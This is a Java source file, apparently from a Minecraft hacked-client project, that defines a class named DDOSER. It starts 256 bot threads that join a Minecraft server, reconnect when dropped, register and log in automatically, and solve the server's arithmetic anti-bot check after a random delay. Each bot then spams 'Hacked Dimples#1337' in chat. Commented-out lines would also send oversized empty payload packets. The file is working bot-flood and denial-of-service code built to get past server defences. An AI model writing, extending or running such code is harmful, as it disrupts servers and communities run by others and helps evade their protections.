package wtf.kiddo.skidcraft.util;

import java.io.File;
import java.io.IOException;
import java.math.BigInteger;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.PublicKey;
import java.util.Arrays;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.crypto.SecretKey;

import net.minecraft.src.CryptManager;
import net.minecraft.src.LogAgent;
import net.minecraft.src.NetHandler;
import net.minecraft.src.Packet;
import net.minecraft.src.Packet205ClientCommand;
import net.minecraft.src.Packet250CustomPayload;
import net.minecraft.src.Packet252SharedKey;
import net.minecraft.src.Packet253ServerAuthData;
import net.minecraft.src.Packet255KickDisconnect;
import net.minecraft.src.Packet2ClientProtocol;
import net.minecraft.src.Packet3Chat;
import wtf.kiddo.skidcraft.utils.MathUtils;

// Author: mckuhei
public class DDOSER extends Thread {

	private static final LogAgent logger = new LogAgent("DDOSER", " [DDOSER]", (new File("ddoser.log")).getAbsolutePath());
	
	private static final byte[] emptyArray = new byte[32767];
	// 我就像个傻逼一样打了20个空格 -cubk
	private static final Packet emptyPacket = new Packet250CustomPayload("                    ", emptyArray);
	
	private static final boolean RECONNECT = true;
	
	private long ticks = 0;
	
	public static LogAgent getLogger() {
		return logger;
	}

	private final String name;
	
	public String getUsername() {
		return name;
	}

	boolean running, logged;

	private TcpConnection connection;
	
	private final InetAddress address;
	private final int port;
	
	public DDOSER(String name, InetAddress address, int port) {
		this.name = name;
		this.address = address;
		this.port = port;
	}
	
	public static void main(String[] args) throws InterruptedException, UnknownHostException {
		InetAddress address = InetAddress.getByName("127.0.0.1");
		for(int i=0;i<256;i++) {
			DDOSER thread = new DDOSER("Dimples_1337_"+(i+1), address, 25565);
			thread.setName("DDOS Thread#"+i);
			thread.start();
			//Thread.sleep(1000);
		}
	}
	
	public void run() {
		while(true) {
			try {
				running = true;
				logged = false;
				connection = new TcpConnection(address, port, name, new DDOSHandler(this), logger);
				addToSendQueue(new Packet2ClientProtocol(61, name, "202.81.231.112", 37705));
				//logged = true;
		        //addToSendQueue(new Packet205ClientCommand(0));
				//byte[] array = new byte[16385];
	    		//Arrays.fill(array, (byte)0);
	    		//array[0] = 1;
	    		//addToSendQueue(new Packet250CustomPayload("EAG|MySkin", array));
				while(!logged&&running) {
					connection.processReadPackets();
					Thread.sleep(50);
				}
				ticks = 0;
				while(running) {
					onTick();
					Thread.sleep(50);
				}
			} catch(InterruptedException e) {
				break;
			} catch(IOException e) {
				
			} catch(Throwable t) {
				t.printStackTrace();
			}
			System.out.println(String.format("用户%s已掉线！", name));
			if(!RECONNECT)
				break;
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	private void onTick() {
		//if(ticks % 4 == 0)
		//	addToSendQueue(emptyPacket);
		//if(ticks++ % 100 == 0)
		ticks++;
		if(ticks % 20 == 0)
			addToSendQueue(new Packet3Chat("Hacked Dimples#1337"));
		connection.processReadPackets();
	}

	public void addToSendQueue(Packet packet) {
		if(connection != null) {
			connection.addToSendQueue(packet);
		}
	}

}
class DDOSHandler extends NetHandler {
	
	private static final Timer timer = new Timer();
	
	private final Random rand = new Random();
	
	private DDOSER ddoser;

	public DDOSHandler(DDOSER ddoser) {
		this.ddoser = ddoser;
	}
	
	public void unexpectedPacket(Packet par1Packet) {
	}
	
	public void handleKickDisconnect(Packet255KickDisconnect par1Packet255KickDisconnect) {
		System.out.println(String.format("用户%s被服务器断开连接！理由:%s", ddoser.getUsername(), par1Packet255KickDisconnect.reason));
		ddoser.running = false;
	}
	
	@Override
	public boolean isServerHandler() {
		return false;
	}
	
	public void handleServerAuthData(Packet253ServerAuthData par1Packet253ServerAuthData)
    {
        String var2 = par1Packet253ServerAuthData.getServerId().trim();
        PublicKey var3 = par1Packet253ServerAuthData.getPublicKey();
        SecretKey var4 = CryptManager.createNewSharedKey();

        this.addToSendQueue(new Packet252SharedKey(var4, var3, par1Packet253ServerAuthData.getVerifyToken()));
    }
	
	public void handleSharedKey(Packet252SharedKey par1Packet252SharedKey)
    {
        this.addToSendQueue(new Packet205ClientCommand(0));
        ddoser.logged = true;
    }
	
	private void addToSendQueue(Packet packet) {
		ddoser.addToSendQueue(packet);
	}

	public void handleChat(final Packet3Chat chatPacket) {
		System.out.println(String.format("[%s] %s", ddoser.getName(), chatPacket.message));
		if(chatPacket.message.endsWith("等于几?(用数字输入)"))
			timer.schedule(new TimerTask() {
				@Override
				public void run() {
					addToSendQueue(new Packet3Chat(MathUtils.solveFunpixel(chatPacket.message)));
				}
			}, rand.nextInt(80) + 20);
		if(chatPacket.message.contains("/login")) {
			addToSendQueue(new Packet3Chat("/l 114514"));
		}
		if(chatPacket.message.contains("/register")) {
			addToSendQueue(new Packet3Chat("/reg 114514 114514"));
		}
	}
	public void handleErrorMessage(String par1Str, Object[] par2ArrayOfObj) {
		ddoser.running = false;
		System.out.println(String.format("[%s] %s %s", ddoser.getName(), par1Str, Arrays.toString(par2ArrayOfObj)));
	}
}